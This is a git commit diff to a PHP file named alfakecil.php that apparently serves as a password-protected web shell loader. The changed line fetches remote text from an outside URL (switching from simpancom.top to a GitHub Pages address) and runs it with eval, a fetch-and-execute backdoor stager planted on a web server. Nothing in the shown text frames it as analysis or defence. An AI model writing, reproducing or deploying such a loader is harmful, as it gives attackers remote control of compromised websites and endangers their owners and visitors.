675f399d059b0383fbc10f1f17c711643d5e638f
gerhana1 <a90853448@gmail.com>
2025-05-15 17:41:08 +0700

    Update alfakecil.php

--- xinz/alfakecil.php
+++ xinz/alfakecil.php
@@ -56,7 +56,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://simpancom.top/server/shelby404/server.txt');
+    $a = geturlsinfo('https://gerhana1.github.io/bingungkali/xinz/alfabesar.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
